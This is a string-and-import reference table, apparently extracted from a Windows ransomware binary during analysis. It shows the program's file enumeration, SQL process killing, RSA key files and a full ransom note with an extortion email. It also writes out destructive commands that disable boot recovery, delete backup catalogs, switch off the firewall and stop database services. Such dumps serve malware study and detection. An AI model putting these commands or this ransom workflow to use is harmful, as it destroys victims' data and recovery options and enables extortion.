reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4044e7	0x519a88	string	0x404440	" not used
0x404d9a	0x519abc	string	0x404cd0	InputBuffer
0x404e74	0x519abc	string	0x404cd0	InputBuffer
0x40512b	0x4cb01a	string	0x405120	j\fh8
0x405240	0x519ae0	string	0x4051f0	InputFileName
0x40526c	0x519b04	string	0x4051f0	InputBinaryMode
0x4052ae	0x4aa163	string	0x4051f0	;\r<1S
0x405362	0x519b24	string	0x405300	OutputFileNameWide
0x405381	0x519b38	string	0x405300	OutputBinaryMode
0x4053b7	0x4aa163	string	0x405300	;\r<1S
0x4054e2	0x519bd8	string	0x4054a0	CipherModeBase: feedback size cannot be specified for this cipher mode
0x405794	0x519b9c	string	0x4056b0	DecodingLookupArray
0x405828	0x519b90	string	0x4056b0	Log2Base
0x405868	0x4aa163	string	0x4056b0	;\r<1S
0x405b50	0x519b78	string	0x405a70	Uppercase
0x405b87	0x519b84	string	0x405a70	GroupSize
0x405bd6	0x519b60	string	0x405a70	Separator
0x405c1c	0x519b6c	string	0x405a70	Terminator
0x405d71	0x519c24	string	0x405d40	/GCM
0x4060f6	0x519b4c	string	0x4060f0	EncodingParameters
0x40644d	0x519bb0	string	0x406370	InsertLineBreaks
0x406484	0x519bc4	string	0x406370	MaxLineLength
0x406c96	0x4aa163	string	0x406c40	;\r<1S
0x406d5c	0x4aa163	string	0x406cb0	;\r<1S
0x406f26	0x519798	string	0x406e80	Unknown exception
0x407024	0x519798	string	0x406fc0	Unknown exception
0x407213	0x519c50	string	0x407090	", "
0x40722a	0x519c50	string	0x407090	", "
0x407303	0x4aa163	string	0x407090	;\r<1S
0x40763a	0x406520	string	0x4075f0	VWh@
0x4076cd	0x406520	string	0x407680	VWh@
0x4076d2	0x519c5c	string	0x407680	copy_file
0x407769	0x519c68	string	0x407720	exists
0x4077ff	0x519ca0	string	0x4077b0	copy
0x407946	0x4aa163	string	0x4078d0	;\r<1S
0x407968	0x4aa163	string	0x4078d0	;\r<1S
0x407987	0x4aa163	string	0x4078d0	;\r<1S
0x4079cb	0x4aa163	string	0x4078d0	;\r<1S
0x4079f3	0x4aa163	string	0x4078d0	;\r<1S
0x407ed7	0x4aa163	string	0x407e20	;\r<1S
0x407f43	0x4aa163	string	0x407f00	;\r<1S
0x407fce	0x4aa163	string	0x407f60	;\r<1S
0x4085b0	0x406520	string	0x407ff0	VWh@
0x40862b	0x4aa163	string	0x407ff0	;\r<1S
0x408858	0x4aa163	string	0x408670	;\r<1S
0x4088e9	0x519ca8	string	0x408890	C:\Windows
0x408904	0x519cc0	string	0x408890	C:\\Windows\
0x408ea0	0x519af0	string	0x408890	InputFileNameWide
0x408ed6	0x519b04	string	0x408890	InputBinaryMode
0x40903b	0x519cf0	string	0x408890	
0x40973f	0x519d28	string	0x408890	Unhandled exception caught
0x4098a5	0x4aa163	string	0x408890	;\r<1S
0x40a159	0x519cf0	string	0x409fb0	
0x40abd5	0x519d28	string	0x409fb0	Unhandled exception caught
0x40ad3e	0x4aa163	string	0x409fb0	;\r<1S
0x40ae1f	0x4f8124	import	0x40ad90	KERNEL32.dll.FindFirstFileW
0x40ae30	0x519d58	string	0x40ad90	fuck
0x40b2b2	0x519d78	string	0x40ad90	IDk.txt
0x40b2c9	0x519d88	string	0x40ad90	Decryption-Guide.txt
0x40b2e0	0x519db4	string	0x40ad90	Decryption-Guide.HTA
0x40b34d	0x519ca8	string	0x40ad90	C:\Windows
0x40b360	0x519cc0	string	0x40ad90	C:\\Windows\
0x40b373	0x519de0	string	0x40ad90	RSAKEY
0x40b5a0	0x4f8150	import	0x40ad90	KERNEL32.dll.lstrcmpW
0x40b5cb	0x519ca8	string	0x40ad90	C:\Windows
0x40b612	0x4f812c	import	0x40ad90	KERNEL32.dll.FindNextFileW
0x40b626	0x4f8138	import	0x40ad90	KERNEL32.dll.FindClose
0x40b8bd	0x4aa163	string	0x40ad90	;\r<1S
0x40b9ad	0x4f8124	import	0x40b920	KERNEL32.dll.FindFirstFileW
0x40b9c0	0x519d58	string	0x40b920	fuck
0x40be8a	0x519ca8	string	0x40b920	C:\Windows
0x40be9d	0x519cc0	string	0x40b920	C:\\Windows\
0x40c0cc	0x519dfc	string	0x40b920	threaad
0x40c0fa	0x519dfc	string	0x40b920	threaad
0x40c129	0x4f8150	import	0x40b920	KERNEL32.dll.lstrcmpW
0x40c154	0x519ca8	string	0x40b920	C:\Windows
0x40c196	0x4f812c	import	0x40b920	KERNEL32.dll.FindNextFileW
0x40c1a5	0x4f8138	import	0x40b920	KERNEL32.dll.FindClose
0x40c43c	0x4aa163	string	0x40b920	;\r<1S
0x40c52f	0x4f8124	import	0x40c4a0	KERNEL32.dll.FindFirstFileW
0x40c540	0x519d58	string	0x40c4a0	fuck
0x40ca04	0x519ca8	string	0x40c4a0	C:\Windows
0x40ca17	0x519cc0	string	0x40c4a0	C:\\Windows\
0x40cc44	0x4f8150	import	0x40c4a0	KERNEL32.dll.lstrcmpW
0x40cc6f	0x519ca8	string	0x40c4a0	C:\Windows
0x40ccb6	0x4f812c	import	0x40c4a0	KERNEL32.dll.FindNextFileW
0x40ccca	0x4f8138	import	0x40c4a0	KERNEL32.dll.FindClose
0x40cf61	0x4aa163	string	0x40c4a0	;\r<1S
0x40d04f	0x4f8124	import	0x40cfc0	KERNEL32.dll.FindFirstFileW
0x40d060	0x519d58	string	0x40cfc0	fuck
0x40d524	0x519ca8	string	0x40cfc0	C:\Windows
0x40d537	0x519cc0	string	0x40cfc0	C:\\Windows\
0x40d6a3	0x4f8150	import	0x40cfc0	KERNEL32.dll.lstrcmpW
0x40d6ce	0x519ca8	string	0x40cfc0	C:\Windows
0x40d715	0x4f812c	import	0x40cfc0	KERNEL32.dll.FindNextFileW
0x40d729	0x4f8138	import	0x40cfc0	KERNEL32.dll.FindClose
0x40d9c0	0x4aa163	string	0x40cfc0	;\r<1S
0x40da9f	0x4f8124	import	0x40da10	KERNEL32.dll.FindFirstFileW
0x40dab0	0x519d58	string	0x40da10	fuck
0x40df74	0x519ca8	string	0x40da10	C:\Windows
0x40df87	0x519cc0	string	0x40da10	C:\\Windows\
0x40e0f3	0x4f8150	import	0x40da10	KERNEL32.dll.lstrcmpW
0x40e11e	0x519ca8	string	0x40da10	C:\Windows
0x40e165	0x4f812c	import	0x40da10	KERNEL32.dll.FindNextFileW
0x40e179	0x4f8138	import	0x40da10	KERNEL32.dll.FindClose
0x40e410	0x4aa163	string	0x40da10	;\r<1S
0x40e4ef	0x4f8124	import	0x40e460	KERNEL32.dll.FindFirstFileW
0x40e500	0x519d58	string	0x40e460	fuck
0x40e8ba	0x519ca8	string	0x40e460	C:\Windows
0x40e923	0x519cc0	string	0x40e460	C:\\Windows\
0x40ea25	0x40ea3b	string	0x40e460	RQ肽\t blocks=Basic Latin,CJK Unified Ideographs
0x40eafc	0x40eb12	string	0x40e460	RQ諼\t blocks=Basic Latin,CJK Unified Ideographs
0x40eb3f	0x4f8150	import	0x40e460	KERNEL32.dll.lstrcmpW
0x40eb6a	0x519ca8	string	0x40e460	C:\Windows
0x40ebb1	0x4f812c	import	0x40e460	KERNEL32.dll.FindNextFileW
0x40ebc5	0x4f8138	import	0x40e460	KERNEL32.dll.FindClose
0x40ee5c	0x4aa163	string	0x40e460	;\r<1S
0x40ef4f	0x4f8124	import	0x40eec0	KERNEL32.dll.FindFirstFileW
0x40ef60	0x519d58	string	0x40eec0	fuck
0x40f21e	0x40f234	string	0x40eec0	RQ艵\t blocks=Basic Latin,CJK Unified Ideographs
0x40f424	0x519ca8	string	0x40eec0	C:\Windows
0x40f437	0x519cc0	string	0x40eec0	C:\\Windows\
0x40f610	0x40f626	string	0x40eec0	RQ藱\t blocks=Basic Latin,CJK Unified Ideographs
0x40f653	0x4f8150	import	0x40eec0	KERNEL32.dll.lstrcmpW
0x40f67e	0x519ca8	string	0x40eec0	C:\Windows
0x40f6c5	0x4f812c	import	0x40eec0	KERNEL32.dll.FindNextFileW
0x40f6d9	0x4f8138	import	0x40eec0	KERNEL32.dll.FindClose
0x40f8f3	0x40f909	string	0x40eec0	RQ贮\t blocks=Basic Latin,CJK Unified Ideographs
0x40f970	0x4aa163	string	0x40eec0	;\r<1S
0x40fa5f	0x4f8124	import	0x40f9d0	KERNEL32.dll.FindFirstFileW
0x40fa70	0x519d58	string	0x40f9d0	fuck
0x40fbf4	0x40fc0a	string	0x40f9d0	RQ賫\t blocks=Basic Latin,CJK Unified Ideographs
0x40ff27	0x519ca8	string	0x40f9d0	C:\Windows
0x40ff3a	0x519cc0	string	0x40f9d0	C:\\Windows\
0x410113	0x410129	string	0x40f9d0	RQ蔦\t blocks=Basic Latin,CJK Unified Ideographs
0x410156	0x4f8150	import	0x40f9d0	KERNEL32.dll.lstrcmpW
0x410181	0x519ca8	string	0x40f9d0	C:\Windows
0x4101c8	0x4f812c	import	0x40f9d0	KERNEL32.dll.FindNextFileW
0x4101dc	0x4f8138	import	0x40f9d0	KERNEL32.dll.FindClose
0x4103f6	0x41040c	string	0x40f9d0	RQ豣\t blocks=Basic Latin,CJK Unified Ideographs
0x410473	0x4aa163	string	0x40f9d0	;\r<1S
0x41051d	0x4f8120	import	0x4104d0	KERNEL32.dll.GetLogicalDrives
0x4105e9	0x4aa449	string	0x4104d0	j\fh
0x410603	0x4aa163	string	0x4104d0	;\r<1S
0x410660	0x519e04	string	0x410630	sqlserver.exe
0x41069a	0x519e14	string	0x410630	msftesql.exe
0x4106cb	0x519e24	string	0x410630	sqlagent.exe
0x4106fc	0x519e34	string	0x410630	sqlbrowser.exe
0x41072d	0x519e44	string	0x410630	sqlwriter.exe
0x410755	0x519e54	string	0x410630	mysqld.exe
0x41077a	0x519e60	string	0x410630	mysqld-nt.exe
0x41079f	0x519e78	string	0x410630	mysqld-opt.exe
0x4107dc	0x4f8148	import	0x410630	KERNEL32.dll.CloseHandle
0x4107f4	0x4f8140	import	0x410630	KERNEL32.dll.CreateToolhelp32Snapshot
0x41080e	0x4f8128	import	0x410630	KERNEL32.dll.Process32First
0x41085a	0x4f813c	import	0x410630	KERNEL32.dll.OpenProcess
0x410869	0x4f8130	import	0x410630	KERNEL32.dll.TerminateProcess
0x410870	0x4f8148	import	0x410630	KERNEL32.dll.CloseHandle
0x41087a	0x4f8148	import	0x410630	KERNEL32.dll.CloseHandle
0x410888	0x4f8144	import	0x410630	KERNEL32.dll.Process32Next
0x4108bc	0x4aa449	string	0x410630	j\fh
0x4108d4	0x4aa163	string	0x410630	;\r<1S
0x410966	0x4f8124	import	0x4108e0	KERNEL32.dll.FindFirstFileW
0x410b04	0x410b1a	string	0x4108e0	RQ補\t blocks=Basic Latin,CJK Unified Ideographs
0x410b9a	0x4f8150	import	0x4108e0	KERNEL32.dll.lstrcmpW
0x410bcc	0x519e8c	string	0x4108e0	\DeCryption-Guide.txt
0x410da7	0x4f812c	import	0x4108e0	KERNEL32.dll.FindNextFileW
0x410dc1	0x4f8138	import	0x4108e0	KERNEL32.dll.FindClose
0x41105d	0x4aa163	string	0x4108e0	;\r<1S
0x411126	0x4f8124	import	0x4110a0	KERNEL32.dll.FindFirstFileW
0x411325	0x41133b	string	0x4110a0	RQ肔\t blocks=Basic Latin,CJK Unified Ideographs
0x41135a	0x4f8150	import	0x4110a0	KERNEL32.dll.lstrcmpW
0x411567	0x4f812c	import	0x4110a0	KERNEL32.dll.FindNextFileW
0x411581	0x4f8138	import	0x4110a0	KERNEL32.dll.FindClose
0x411616	0x41162c	string	0x4110a0	RQ葑\t blocks=Basic Latin,CJK Unified Ideographs
0x4116be	0x41171a	string	0x4110a0	RQ裐\t blocks=Basic Latin,CJK Unified Ideographs
0x4116d4	0x41171a	string	0x4110a0	RQ裐\t blocks=Basic Latin,CJK Unified Ideographs
0x41181d	0x4aa163	string	0x4110a0	;\r<1S
0x4118fa	0x519f10	string	0x4118c0	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x4119d6	0x4aa163	string	0x4118c0	;\r<1S
0x411ab9	0x519f6c	string	0x4119f0	C:\ProgramData\IDk.txt
0x411afd	0x519f84	string	0x4119f0	C:\ProgramData\pkey.txt
0x411cd6	0x519f84	string	0x4119f0	C:\ProgramData\pkey.txt
0x411e43	0x519f6c	string	0x4119f0	C:\ProgramData\IDk.txt
0x411f49	0x519f9c	string	0x4119f0	C:\ProgramData
0x411fdd	0x519f9c	string	0x4119f0	C:\ProgramData
0x41206f	0x519ee8	string	0x4119f0	0123456789
0x4121a4	0x519ef4	string	0x4119f0	QWERTYUIOPASDFGHJKLZXCVBNM
0x4123f7	0x41240d	string	0x4119f0	RQ调\t blocks=Basic Latin,CJK Unified Ideographs
0x4124f6	0x41250c	string	0x4119f0	RQ豂\t blocks=Basic Latin,CJK Unified Ideographs
0x412529	0x519f6c	string	0x4119f0	C:\ProgramData\IDk.txt
0x412956	0x519f84	string	0x4119f0	C:\ProgramData\pkey.txt
0x412985	0x519b14	string	0x4119f0	OutputFileName
0x4129a7	0x519b38	string	0x4119f0	OutputBinaryMode
0x412a4f	0x519fb0	string	0x4119f0	95DE4925807931C8D34E1D9460A2DE
0x412a76	0x519fd0	string	0x4119f0	B56BFF3C6B2E0F4E9F1DAE9E473CB39B6EE513DDC656B7B925468DE9FBCC1AB57E148DDE1009F8B7529A4E84850D7ECF43637A2D898EAEA3579544028F90370C65820B44A2C0B842A5D993F34FA8C549E9B20932D8BE55992CE50C95510FDD95734C8FFF874E771D33225664466F6E226FAF33FE35714A61E147AF2F17CF81015EEFBE8274C2672480956E3D44D54675E7725C53E334CBD146FA0B9B1F239898BDC3E5566E0DCB0E5FAEE35B685C0EEA7885CAE76DAA4A467E168C2AD1B1D32D883203A8F3A5FEA70903CC6F49067F099D2CAEED344F339E3BF1512BFC566CD2B3D68FC69A12BBFC565067CD777B65F7D9DA0A246CF4DA8C9362B55E9184658243C060381312A10A356D2039CA76CBC6BD1679E983ED653567CB8DBD7DC2FAF4F4F539EE41C6DB9B53C04F0F90CDA65FB3378739A75E016753EBA8FB838E8EE2AFC92FDB1CC3C4C94B88CFADC42BC1D781787661EEADA813C4A8802AD3211E04A39DEFA683CEEC8CFA9195936BCF66B3D42729A1E7E61AB4C521E2232365217743381CFD4B58FEE404639320574FA8C46580291B5412259D2CEEADF947D4DA5AD5EE3D149B2F80D969525DD8E8E1FA3983C9930577534CF1A00A264A482C709A1278BD1EB24AB328
0x412c85	0x51a364	string	0x4119f0	https://api.my-ip.io/ip
0x412d4c	0x51a37c	string	0x4119f0	%d-%m-%Y %H:%M:%S
0x412db9	0x51a390	string	0x4119f0	C:\ProgramData\prvkey.txt
0x412eac	0x51a488	string	0x4119f0	\n\nID=
0x412ece	0x51a3c4	string	0x4119f0	Disksize=
0x412fcf	0x51a3bc	string	0x4119f0	Mail=
0x41308e	0x51a3b4	string	0x4119f0	Ip=
0x41314a	0x51a3ac	string	0x4119f0	Date:
0x4136a8	0x51a390	string	0x4119f0	C:\ProgramData\prvkey.txt
0x4136eb	0x51a490	string	0x4119f0	C:\ProgramData\RSAKEY.key
0x413b5a	0x519cf0	string	0x4119f0	
0x413e9f	0x51a4d4	string	0x4119f0	RSAKEY-
0x413ee0	0x4f8134	import	0x4119f0	KERNEL32.dll.GetDriveTypeA
0x413f94	0x51a4e8	string	0x4119f0	.key
0x41406b	0x51a490	string	0x4119f0	C:\ProgramData\RSAKEY.key
0x4140c2	0x51a4f8	string	0x4119f0	fuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyou
0x4142c3	0x4aa449	string	0x4119f0	j\fh
0x4142fa	0x4aa163	string	0x4119f0	;\r<1S
0x414906	0x4f814c	import	0x4147c0	KERNEL32.dll.FreeConsole
0x4149a6	0x519fb0	string	0x4147c0	95DE4925807931C8D34E1D9460A2DE
0x4149cb	0x51a5f4	string	0x4147c0	DecHelper@yandex.com
0x4149f3	0x51a5f4	string	0x4147c0	DecHelper@yandex.com
0x414dfd	0x51a610	string	0x4147c0	61C8EB7FE2C8A9F99CD75A787586CF5EB4393665ABC91BF3F6E6D2A2018DF7142BCD6EA74F6566F9014CC9E7C1B3E4836CDFADE8C6C13FAF042CC1004195EB0633AA866975E37B0B74D8D7BD63E85F6E602D67AF2E7FD127
0x414e2d	0x51a610	string	0x4147c0	61C8EB7FE2C8A9F99CD75A787586CF5EB4393665ABC91BF3F6E6D2A2018DF7142BCD6EA74F6566F9014CC9E7C1B3E4836CDFADE8C6C13FAF042CC1004195EB0633AA866975E37B0B74D8D7BD63E85F6E602D67AF2E7FD127
0x41524a	0x51a6c4	string	0x4147c0	.blender
0x4152dd	0x51a6d0	string	0x4147c0	net stop MSDTC
0x4152e7	0x51a6e0	string	0x4147c0	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x4152f1	0x51a71c	string	0x4147c0	bcdedit /set {default} recoveryenabled no
0x4152fb	0x51a748	string	0x4147c0	wbadmin delete catalog -quiet
0x415305	0x51a768	string	0x4147c0	net stop SQLSERVERAGENT
0x41530f	0x51a780	string	0x4147c0	net stop MSSQLSERVER
0x415319	0x51a798	string	0x4147c0	net stop vds
0x415323	0x51a7a8	string	0x4147c0	netsh advfirewall set currentprofile state off
0x41532d	0x51a7d8	string	0x4147c0	netsh firewall set opmode mode=disable
0x415337	0x51a800	string	0x4147c0	net stop SQLWriter
0x415341	0x51a814	string	0x4147c0	net stop SQLBrowser
0x41534b	0x51a780	string	0x4147c0	net stop MSSQLSERVER
0x415355	0x51a828	string	0x4147c0	net stop MSSQL$CONTOSO1
0x4153c5	0x4f8134	import	0x4147c0	KERNEL32.dll.GetDriveTypeA
0x415576	0x4aaac0	string	0x4147c0	WVS3
0x415584	0x4aaac0	string	0x4147c0	WVS3
0x41577f	0x51a868	string	0x4147c0	Your Files Are Has Been Locked\n\nYour Files Has Been Encrypted with cryptography Algorithm\n\nIf You Need Your Files And They are Important to You, Dont be shy Send Me an Email\n\nSend Test File + The Key File on Your System (File Exist in C:/ProgramData example : RSAKEY-SE-24r6t523 pr RSAKEY.KEY) to Make Sure Your Files Can be Restored\n\nMake an Agreement on Price with me and Pay\n\n\n\nGet Decryption Tool + RSA Key AND Instruction For Decryption Process\n\n\n\nAttention:\n\n1- Do Not Rename or Modify The Files (You May loose That file)\n\n2- Do Not Try To Use 3rd Party Apps or Recovery Tools ( if You want to do that make an copy from Files and try on them and Waste Your time )\n\n3-Do not Reinstall Operation System(Windows) You may loose the key File and Loose Your Files\n\n4-Do Not Always Trust to Middle mans and negotiators (some of them are good but some of them agree on 4000usd for example and Asked 10000usd From Client) this Was happened\n\n\n\nYour Case ID :
0x415794	0x51a840	string	0x4147c0	\n\nOUR Email :
0x4158ef	0x51b078	string	0x4147c0	<!DOCTYPE html>\n<html lang='en'>\n<head>\n <meta http-equiv='X-UA-Compatible' content='IE=9' /> <script type='text/javascript'> window.resizeTo(window.screen.width,window.screen.height);</script> <meta charset='UTF - 8'>\n <title>Your Files Are Locked</title>\n <meta http-equiv='x - ua - compatible' content='IE = 9'/>\n <style>\n body { \n background-image: url('https://thumbor.forbes.com/thumbor/711x399/https://specials-images.forbesimg.com/imageserve/60b123d8f2894ada36d1fb5b/Lock---abstract-glitch-background/960x0.jpg');\n background-size: cover; \n font-size: 15pt;\n font-weight:bolder ;\n text-align: center;\n margin: auto;\n \n\n } #div1 {\n margin: auto;\n margin-top:50px;\n text-align: center;\n background-color: rgb(41, 46, 56);\n opacity: 95%;\n border-radius: 50px 20px;\n width: 60%;\n color: white;\n color: wheat;\n \n\n } #div2 {\n margin: auto;\n margin-top: 40px;\n text-align: center;\n background-color: rgb(41, 46, 56);\n opacity: 95%;\n border-radius: 50px 20px;\n width: 60%;\ncolor: wheat;\n } \n\n #div3{ \n color: white;\n margin: auto;\n margin-top:40px;\n text-align: center;\n background-color: rgb(41, 46, 56);\n opacity: 95%;\n border-radius: 50px 20px;\n width: 60%;\n } \n\n </style>\n</head>\n<body>\n<div id='div0'>\n<div id='div1'>\n Your Files Are Has Been Locked\n <br>\n Your Files Has Been Encrypted with cryptography Algorithm\n <br>\n If You Need Your Files And They are Important to You, Dont be shy Send Me an Email\n <br>\n Send Test File + The Key File on Your System (File Exist in C:/ProgramData example : KEY-SE-24r6t523 or RSAKEY.KEY) to Make Sure Your Fi
0x4158fe	0x51b030	string	0x4147c0	\n <br>\n Our Email:
0x4159aa	0x51afe0	string	0x4147c0	\n </div> \n </div>\n</body>\n</html>
0x415b94	0x4f8134	import	0x4147c0	KERNEL32.dll.GetDriveTypeA
0x415f95	0x519e8c	string	0x4147c0	\DeCryption-Guide.txt
0x4162ca	0x519d28	string	0x4147c0	Unhandled exception caught
0x416319	0x4f8134	import	0x4147c0	KERNEL32.dll.GetDriveTypeA
0x416650	0x4aa163	string	0x4147c0	;\r<1S
0x416697	0x519d28	string	0x4147c0	Unhandled exception caught
0x416d57	0x416d62	string	0x416ce0	3ɉN`Ɔ blocks=Basic Latin,Latin Extended-B
0x417668	0x417679	string	0x417620	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41766e	0x417679	string	0x417620	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41772b	0x519ac8	string	0x417720	SHA-1
0x4178b7	0x51c620	string	0x417880	OutputStringPointer
0x418587	0x418599	string	0x4184d0	3ۋE\b blocks=Basic Latin,Arabic
0x4185ac	0x4185f3	string	0x4184d0	VS視\n blocks=Basic Latin,CJK Unified Ideographs
0x418c43	0x418c47	string	0x418c20	WPRQ
0x418d56	0x4aa163	string	0x418c80	;\r<1S
0x418e5f	0x4aa163	string	0x418d70	;\r<1S
0x4190d5	0x4cdbca	string	0x419040	j\fh`
0x4192c4	0x4aa163	string	0x419040	;\r<1S
0x41941a	0x4aa163	string	0x4193f0	;\r<1S
0x419458	0x4aa163	string	0x4193f0	;\r<1S
0x4194bb	0x4aa163	string	0x4193f0	;\r<1S
0x41954e	0x4aa163	string	0x4193f0	;\r<1S
0x419772	0x4197a7	string	0x419690	;O\fs
0x41992b	0x4aa163	string	0x419690	;\r<1S
0x41a0d4	0x4aa163	string	0x41a000	;\r<1S
0x41a1ec	0x4aa163	string	0x41a0e0	;\r<1S
0x41a7d5	0x4aa163	string	0x41a580	;\r<1S
0x41a905	0x4aa163	string	0x41a8e0	;\r<1S
0x41a941	0x4aa163	string	0x41a8e0	;\r<1S
0x41a982	0x4cb01a	string	0x41a8e0	j\fh8
0x41a99c	0x4aa163	string	0x41a8e0	;\r<1S
0x41a9fb	0x4aa163	string	0x41a8e0	;\r<1S
0x41aa3e	0x4aa163	string	0x41a8e0	;\r<1S
0x41af04	0x41af0f	string	0x41aeb0	3ɉN` blocks=Basic Latin,Latin Extended-B
0x41baea	0x41bafb	string	0x41bac0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41baf0	0x41bafb	string	0x41bac0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41be2c	0x4aa163	string	0x41bdd0	;\r<1S
0x41bfc6	0x4aa163	string	0x41be40	;\r<1S
0x41c166	0x4aa163	string	0x41bfe0	;\r<1S
0x41c1f0	0x4aa163	string	0x41c180	;\r<1S
0x41c270	0x4aa163	string	0x41c200	;\r<1S
0x41c2ed	0x4aa163	string	0x41c280	;\r<1S
0x41c36d	0x4aa163	string	0x41c300	;\r<1S
0x41c564	0x4aa163	string	0x41c380	;\r<1S
0x41c7f3	0x51c6c4	string	0x41c7c0	BufferedTransformation: this object doesn't allow input
0x41c953	0x51c6c4	string	0x41c920	BufferedTransformation: this object doesn't allow input
0x41d19e	0x4aa163	string	0x41d130	;\r<1S
0x41d1d6	0x4aa163	string	0x41d130	;\r<1S
0x41d1e8	0x4aa163	string	0x41d130	;\r<1S
0x41d8b2	0x4aa163	string	0x41d850	;\r<1S
0x41d8ea	0x4aa163	string	0x41d850	;\r<1S
0x41d8fc	0x4aa163	string	0x41d850	;\r<1S
0x41d9f6	0x4aa163	string	0x41d910	;\r<1S
0x41df20	0x51c6fc	string	0x41df20	vector<T> too long
0x41e4ff	0x4aa163	string	0x41e0f0	;\r<1S
0x41ea0f	0x4aa163	string	0x41e5b0	;\r<1S
0x41eb3d	0x519c34	string	0x41eaf0	MGF1
0x41ebc2	0x519ac8	string	0x41eaf0	SHA-1
0x41ede0	0x51c768	string	0x41ede0	invalid string position
0x41eeaa	0x4aa163	string	0x41edf0	;\r<1S
0x41f4f1	0x4aa163	string	0x41f380	;\r<1S
0x41f568	0x51a4f0	string	0x41f500	RSAKEY-
0x41f89e	0x4aa163	string	0x41f7d0	;\r<1S
0x41f9af	0x4aa163	string	0x41f8b0	;\r<1S
0x41fabf	0x4aa163	string	0x41f9c0	;\r<1S
0x41fb2b	0x519ad0	string	0x41faf0	FeedbackSize
0x41fb50	0x4aa163	string	0x41faf0	;\r<1S
0x41fc60	0x4aa163	string	0x41fb60	;\r<1S
0x41fde8	0x4aa163	string	0x41fc70	;\r<1S
0x4200b8	0x4aa163	string	0x41fff0	;\r<1S
0x4202c8	0x4aa163	string	0x420110	;\r<1S
0x4205f1	0x519df0	string	0x420480	shit
0x420bed	0x4aa163	string	0x420b40	;\r<1S
0x420f74	0x4aa163	string	0x420de0	;\r<1S
0x42115e	0x4aa163	string	0x420fd0	;\r<1S
